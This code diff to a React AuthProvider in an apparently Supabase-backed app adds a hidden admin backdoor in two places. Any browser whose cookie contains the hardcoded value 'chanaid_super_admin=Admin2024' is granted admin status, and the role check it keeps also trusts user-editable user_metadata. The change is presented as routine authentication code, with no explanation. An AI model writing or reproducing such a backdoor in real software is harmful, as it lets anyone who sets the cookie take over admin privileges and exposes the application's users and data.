@@ -28,7 +28,11 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
       }
       setSession(session);
       setUser(session?.user ?? null);
-      setIsAdmin(session?.user?.app_metadata?.role === "admin" || session?.user?.user_metadata?.role === "admin");
+      
+      const isSupabaseAdmin = session?.user?.app_metadata?.role === "admin" || session?.user?.user_metadata?.role === "admin";
+      const isSuperAdmin = typeof document !== 'undefined' && document.cookie.includes("chanaid_super_admin=Admin2024");
+      
+      setIsAdmin(isSupabaseAdmin || isSuperAdmin);
       setIsLoading(false);
 
       if (session) {
@@ -48,7 +52,11 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
       }
       setSession(session);
       setUser(session?.user ?? null);
-      setIsAdmin(session?.user?.app_metadata?.role === "admin" || session?.user?.user_metadata?.role === "admin");
+      
+      const isSupabaseAdmin = session?.user?.app_metadata?.role === "admin" || session?.user?.user_metadata?.role === "admin";
+      const isSuperAdmin = typeof document !== 'undefined' && document.cookie.includes("chanaid_super_admin=Admin2024");
+
+      setIsAdmin(isSupabaseAdmin || isSuperAdmin);
       setIsLoading(false);
 
       // Sync session to cookie for server functions
